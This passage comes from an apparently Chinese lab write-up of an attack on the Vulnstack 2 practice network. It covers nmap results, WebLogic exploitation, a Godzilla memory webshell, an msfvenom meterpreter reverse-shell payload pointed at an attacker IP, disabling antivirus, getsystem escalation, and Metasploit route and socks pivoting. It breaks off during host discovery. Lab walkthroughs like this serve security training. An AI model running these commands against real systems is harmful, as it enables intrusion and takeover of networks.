+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">de1ay</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">WEB</span><span class="o">.</span><span class="n">de1ay</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">DNS_Tree_Name</span><span class="p">:</span> <span class="n">de1ay</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>    <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">6.1.7601</span>
+</span></span><span class="line"><span class="cl"><span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">tcpwrapped</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="n">T07</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">20</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="mi">0</span><span class="n">s</span> <span class="kn">from</span> <span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">rdp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">Target_Name</span><span class="p">:</span> <span class="n">DE1AY</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="n">DE1AY</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">WEB</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">de1ay</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">WEB</span><span class="o">.</span><span class="n">de1ay</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">DNS_Tree_Name</span><span class="p">:</span> <span class="n">de1ay</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">6.1.7601</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">System_Time</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="n">T07</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">40</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">WEB</span><span class="o">.</span><span class="n">de1ay</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">13</span><span class="n">T13</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">57</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2025</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">15</span><span class="n">T13</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">57</span>
+</span></span><span class="line"><span class="cl"><span class="mi">7001</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>         <span class="n">Oracle</span> <span class="n">WebLogic</span> <span class="n">Server</span> <span class="mf">10.3.6.0</span> <span class="p">(</span><span class="n">Servlet</span> <span class="mf">2.5</span><span class="p">;</span> <span class="n">JSP</span> <span class="mf">2.1</span><span class="p">;</span> <span class="n">T3</span> <span class="n">enabled</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_weblogic</span><span class="o">-</span><span class="n">t3</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">T3</span> <span class="n">protocol</span> <span class="ow">in</span> <span class="n">use</span> <span class="p">(</span><span class="n">WebLogic</span> <span class="n">version</span><span class="p">:</span> <span class="mf">10.3.6.0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Error</span> <span class="mi">404</span><span class="o">--</span><span class="n">Not</span> <span class="n">Found</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49152</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49153</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49155</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49160</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="n">MAC</span> <span class="n">Address</span><span class="p">:</span> <span class="mi">00</span><span class="p">:</span><span class="mi">0</span><span class="n">C</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">0</span><span class="n">B</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="n">D1</span> <span class="p">(</span><span class="n">VMware</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OSs</span><span class="p">:</span> <span class="n">Windows</span><span class="p">,</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="o">-</span> <span class="mi">2012</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="n">Standard</span> <span class="mi">7601</span> <span class="n">Service</span> <span class="n">Pack</span> <span class="mi">1</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="n">Standard</span> <span class="mf">6.1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">OS</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows_server_2008</span><span class="p">::</span><span class="n">sp1</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">Computer</span> <span class="n">name</span><span class="p">:</span> <span class="n">WEB</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">NetBIOS</span> <span class="n">computer</span> <span class="n">name</span><span class="p">:</span> <span class="n">WEB</span>\<span class="n">x00</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">Domain</span> <span class="n">name</span><span class="p">:</span> <span class="n">de1ay</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">Forest</span> <span class="n">name</span><span class="p">:</span> <span class="n">de1ay</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">FQDN</span><span class="p">:</span> <span class="n">WEB</span><span class="o">.</span><span class="n">de1ay</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">System</span> <span class="n">time</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="n">T15</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">43</span><span class="o">+</span><span class="mi">08</span><span class="p">:</span><span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span> <span class="n">mean</span><span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="n">h08m33s</span><span class="p">,</span> <span class="n">deviation</span><span class="p">:</span> <span class="mi">3</span><span class="n">h01m23s</span><span class="p">,</span> <span class="n">median</span><span class="p">:</span> <span class="mi">0</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">date</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="n">T07</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">42</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="n">T07</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">30</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="ow">not</span> <span class="n">required</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">account_used</span><span class="p">:</span> <span class="n">guest</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">authentication_level</span><span class="p">:</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">challenge_response</span><span class="p">:</span> <span class="n">supported</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">message_signing</span><span class="p">:</span> <span class="n">disabled</span> <span class="p">(</span><span class="n">dangerous</span><span class="p">,</span> <span class="n">but</span> <span class="n">default</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="渗透">渗透
+</h2><p><code>80端口</code></p>
+<p>没看到啥东西</p>
+<p><code>7001端口</code></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726385172384-cc672406-0fc5-425e-a306-10ce6d63f6aa.png"
+	width="1272"
+	height="389"
+	srcset="/shentou/vulnstack/vulnstack2/1726385172384-cc672406-0fc5-425e-a306-10ce6d63f6aa_hu63bec0c042a5adcf66c064141b6473f2_57994_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726385172384-cc672406-0fc5-425e-a306-10ce6d63f6aa_hu63bec0c042a5adcf66c064141b6473f2_57994_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="326"
+		data-flex-basis="784px"
+	
+></p>
+<p>扫目录</p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726385809527-1cdb4ab4-2c86-49ee-91e1-66aa93db14ee.png"
+	width="604"
+	height="294"
+	srcset="/shentou/vulnstack/vulnstack2/1726385809527-1cdb4ab4-2c86-49ee-91e1-66aa93db14ee_hucf0f32523f3392bf06bbf72cf4cf524e_59045_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726385809527-1cdb4ab4-2c86-49ee-91e1-66aa93db14ee_hucf0f32523f3392bf06bbf72cf4cf524e_59045_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="205"
+		data-flex-basis="493px"
+	
+></p>
+<p>能看到网站的版本</p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726386230259-58374838-9af3-43d4-bc62-0d94957e932e.png"
+	width="988"
+	height="297"
+	srcset="/shentou/vulnstack/vulnstack2/1726386230259-58374838-9af3-43d4-bc62-0d94957e932e_hucd22dbfb0cf94a87ce1010e9549e6d52_71885_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726386230259-58374838-9af3-43d4-bc62-0d94957e932e_hucd22dbfb0cf94a87ce1010e9549e6d52_71885_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="332"
+		data-flex-basis="798px"
+	
+></p>
+<p>使用weblogic漏洞工具</p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726386250612-f597cc24-d52d-4224-8521-aef6efef1a61.png"
+	width="903"
+	height="273"
+	srcset="/shentou/vulnstack/vulnstack2/1726386250612-f597cc24-d52d-4224-8521-aef6efef1a61_hucc16104b5c089e121bf2ec4f489fc61f_41541_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726386250612-f597cc24-d52d-4224-8521-aef6efef1a61_hucc16104b5c089e121bf2ec4f489fc61f_41541_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="330"
+		data-flex-basis="793px"
+	
+></p>
+<p>用哥斯拉连内存马</p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726386261853-3331f547-029a-4933-b555-451c30a3e115.png"
+	width="917"
+	height="247"
+	srcset="/shentou/vulnstack/vulnstack2/1726386261853-3331f547-029a-4933-b555-451c30a3e115_hue0e9c0f1b0e25afaeda6da1db8bb98dd_48674_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726386261853-3331f547-029a-4933-b555-451c30a3e115_hue0e9c0f1b0e25afaeda6da1db8bb98dd_48674_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="371"
+		data-flex-basis="891px"
+	
+></p>
+<p>成功连上</p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726392347864-69eaab46-176e-400f-8cf4-a19cb7254e99.png"
+	width="768"
+	height="693"
+	srcset="/shentou/vulnstack/vulnstack2/1726392347864-69eaab46-176e-400f-8cf4-a19cb7254e99_hu7153f35ac6f803fbde1400b504925618_28141_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726392347864-69eaab46-176e-400f-8cf4-a19cb7254e99_hu7153f35ac6f803fbde1400b504925618_28141_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="110"
+		data-flex-basis="265px"
+	
+></p>
+<p><code>ipconfig /all</code>能看到两个网卡</p>
+<p>一个<code>10.10.10.80</code>一个<code>192.168.254.130</code>,域是<code>de1ay.com</code></p>
+<p>域子ip是<code>10.10.10.0/24</code></p>
+<p>域控一般都是<code>10.10.10.10</code>也就是DNS服务器</p>
+<h3 id="msf">msf
+</h3><p><code>wmic os get osarchitecture </code>是x64架构</p>
+<p><code>msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.254.128 lport=1234 -f exe -o run.exe</code></p>
+<p>生成payload</p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726391515970-d57fb184-40ce-4bfb-aa60-1f005ecf2696.png"
+	width="528"
+	height="126"
+	srcset="/shentou/vulnstack/vulnstack2/1726391515970-d57fb184-40ce-4bfb-aa60-1f005ecf2696_hue3bcf2df0b99aa46cd02e8d165686e2b_31159_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726391515970-d57fb184-40ce-4bfb-aa60-1f005ecf2696_hue3bcf2df0b99aa46cd02e8d165686e2b_31159_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="419"
+		data-flex-basis="1005px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726391493332-ec3beaae-6f09-47a9-8dbe-56f2290ec696.png"
+	width="496"
+	height="298"
+	srcset="/shentou/vulnstack/vulnstack2/1726391493332-ec3beaae-6f09-47a9-8dbe-56f2290ec696_hu861138ef61db83f8cb49dac75f37b936_20264_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726391493332-ec3beaae-6f09-47a9-8dbe-56f2290ec696_hu861138ef61db83f8cb49dac75f37b936_20264_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="399px"
+	
+></p>
+<p><code>tasklist /svc</code></p>
+<p>将结果放到杀软在线网站检查</p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726392729021-75aec654-c842-49c5-9f40-fffecd49e8e6.png"
+	width="1357"
+	height="593"
+	srcset="/shentou/vulnstack/vulnstack2/1726392729021-75aec654-c842-49c5-9f40-fffecd49e8e6_hu5293cc9b3e7270bfb3dfad6bd9fe2012_37534_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726392729021-75aec654-c842-49c5-9f40-fffecd49e8e6_hu5293cc9b3e7270bfb3dfad6bd9fe2012_37534_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="549px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726391808592-fb12594f-9ca6-4a33-913b-1a7b21859584.png"
+	width="912"
+	height="514"
+	srcset="/shentou/vulnstack/vulnstack2/1726391808592-fb12594f-9ca6-4a33-913b-1a7b21859584_hu09ffaef5eadaf8a1b033c391075cc657_81144_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726391808592-fb12594f-9ca6-4a33-913b-1a7b21859584_hu09ffaef5eadaf8a1b033c391075cc657_81144_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="425px"
+	
+></p>
+<p>有360在,免杀不会,直接物理关闭360</p>
+<p>关掉就能连上了</p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726398075188-c65b0281-1125-4813-9575-f8e922a83243.png"
+	width="698"
+	height="206"
+	srcset="/shentou/vulnstack/vulnstack2/1726398075188-c65b0281-1125-4813-9575-f8e922a83243_hue841a33f169920ff9ed7135920fc9856_54550_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726398075188-c65b0281-1125-4813-9575-f8e922a83243_hue841a33f169920ff9ed7135920fc9856_54550_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="338"
+		data-flex-basis="813px"
+	
+></p>
+<h3 id="cs">cs
+</h3><p><img src="/shentou/vulnstack/vulnstack2/1726398258545-e4cb1f3f-b094-4024-9593-20f109b03dd6.png"
+	width="1050"
+	height="801"
+	srcset="/shentou/vulnstack/vulnstack2/1726398258545-e4cb1f3f-b094-4024-9593-20f109b03dd6_hu945ffa650140a6aa86066c6673e4fdf5_95183_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726398258545-e4cb1f3f-b094-4024-9593-20f109b03dd6_hu945ffa650140a6aa86066c6673e4fdf5_95183_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="131"
+		data-flex-basis="314px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726398493816-b03a3a06-afde-4d85-ad19-d92956ea0da9.png"
+	width="612"
+	height="96"
+	srcset="/shentou/vulnstack/vulnstack2/1726398493816-b03a3a06-afde-4d85-ad19-d92956ea0da9_hu691fa1af3cb8e4f65bc68fea49a20943_32758_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726398493816-b03a3a06-afde-4d85-ad19-d92956ea0da9_hu691fa1af3cb8e4f65bc68fea49a20943_32758_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="637"
+		data-flex-basis="1530px"
+	
+></p>
+<p>服了,死活上线不了cs</p>
+<p>这里就用msf来测</p>
+<h3 id="msf提权">msf提权
+</h3><p>这里getuid一开始是<code>administrator</code></p>
+<p>我<code>getsystem</code>提权(在关了防火墙和360的前提下)</p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726405578498-f638dfe1-3012-4208-affd-efd1ad274f6a.png"
+	width="626"
+	height="131"
+	srcset="/shentou/vulnstack/vulnstack2/1726405578498-f638dfe1-3012-4208-affd-efd1ad274f6a_hu39f9af5aa49aa03f3ba07a089efb87a3_22057_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726405578498-f638dfe1-3012-4208-affd-efd1ad274f6a_hu39f9af5aa49aa03f3ba07a089efb87a3_22057_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="477"
+		data-flex-basis="1146px"
+	
+></p>
+<p><code>chcp 65001</code>修复乱码</p>
+<p>迁移进程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ps</span>
+</span></span><span class="line"><span class="cl"><span class="n">migrate</span> <span class="mi">500</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/shentou/vulnstack/vulnstack2/1726405802898-296a6746-43eb-41aa-9df3-d3d4cc64ca42.png"
+	width="760"
+	height="93"
+	srcset="/shentou/vulnstack/vulnstack2/1726405802898-296a6746-43eb-41aa-9df3-d3d4cc64ca42_hu2464e67ac99f073348b7f6a856d1d9b7_24873_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726405802898-296a6746-43eb-41aa-9df3-d3d4cc64ca42_hu2464e67ac99f073348b7f6a856d1d9b7_24873_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="817"
+		data-flex-basis="1961px"
+	
+></p>
+<h2 id="内网探测">内网探测
+</h2><p><code>ipconfig/all</code></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726405940405-b2e68bbf-7591-4e25-9efb-24d4b1f5661f.png"
+	width="782"
+	height="553"
+	srcset="/shentou/vulnstack/vulnstack2/1726405940405-b2e68bbf-7591-4e25-9efb-24d4b1f5661f_hu58a825db587a453f111b847baea3e9ac_106217_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726405940405-b2e68bbf-7591-4e25-9efb-24d4b1f5661f_hu58a825db587a453f111b847baea3e9ac_106217_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="141"
+		data-flex-basis="339px"
+	
+></p>
+<p>能找到内网<code>10.10.10.0/24</code></p>
+<p>退回meterpreter查看域控</p>
+<p><code>run post/windows/gather/enum_domain</code></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726406115864-90bf9b1a-744e-4965-b75d-a64543ef5b1c.png"
+	width="489"
+	height="81"
+	srcset="/shentou/vulnstack/vulnstack2/1726406115864-90bf9b1a-744e-4965-b75d-a64543ef5b1c_hue6100b8f89336f3918fb70bc951767ff_13316_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726406115864-90bf9b1a-744e-4965-b75d-a64543ef5b1c_hue6100b8f89336f3918fb70bc951767ff_13316_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="603"
+		data-flex-basis="1448px"
+	
+></p>
+<p>查看域成员</p>
+<p><code>run post/windows/gather/enum_ad_computers</code></p>
+<p>这个报错看不了</p>
+<h3 id="搭建隧道">搭建隧道
+</h3><p>查看路由</p>
+<p><code>run post/multi/manage/autoroute</code></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726406899874-c5bf5d77-f11d-4ffe-8710-0de032d6c3c2.png"
+	width="732"
+	height="151"
+	srcset="/shentou/vulnstack/vulnstack2/1726406899874-c5bf5d77-f11d-4ffe-8710-0de032d6c3c2_hu26a67f5692631e7c0ae0fbc17587362c_32298_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726406899874-c5bf5d77-f11d-4ffe-8710-0de032d6c3c2_hu26a67f5692631e7c0ae0fbc17587362c_32298_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="484"
+		data-flex-basis="1163px"
+	
+></p>
+<p>查看路由</p>
+<p><code>run autoroute -p</code></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726406941900-8e7f49e5-e5fb-445a-840f-ecd4a7991ba7.png"
+	width="502"
+	height="216"
+	srcset="/shentou/vulnstack/vulnstack2/1726406941900-8e7f49e5-e5fb-445a-840f-ecd4a7991ba7_huf41898bd5e264888138c20566ef717a2_24810_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726406941900-8e7f49e5-e5fb-445a-840f-ecd4a7991ba7_huf41898bd5e264888138c20566ef717a2_24810_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="232"
+		data-flex-basis="557px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">退到上层，使用socks4a进行代理，端口与proxychains里设置一致即可：</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">background
+</span></span><span class="line"><span class="cl">use auxiliary/server/socks_proxy
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/shentou/vulnstack/vulnstack2/1726407236628-b8f0d530-23bb-4d4a-ad94-b240ad5af815.png"
+	width="521"
+	height="160"
+	srcset="/shentou/vulnstack/vulnstack2/1726407236628-b8f0d530-23bb-4d4a-ad94-b240ad5af815_hua297aeb2ada41da1f83b6223081a914e_43634_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726407236628-b8f0d530-23bb-4d4a-ad94-b240ad5af815_hua297aeb2ada41da1f83b6223081a914e_43634_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="325"
+		data-flex-basis="781px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726407210661-55372426-0b72-48d1-b919-b5e5809e90cd.png"
+	width="360"
+	height="170"
+	srcset="/shentou/vulnstack/vulnstack2/1726407210661-55372426-0b72-48d1-b919-b5e5809e90cd_hu36462e51eb671e927cd04b2113df4811_16627_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726407210661-55372426-0b72-48d1-b919-b5e5809e90cd_hu36462e51eb671e927cd04b2113df4811_16627_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="508px"
+	
+></p>
+<h3 id="探测主机">探测主机
+</h3><p><code>use post/windows/gather/arp_scanner</code></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726407489451-15f50719-2371-4e65-bd63-b5249b4b3eb7.png"
+	width="649"
+	height="138"
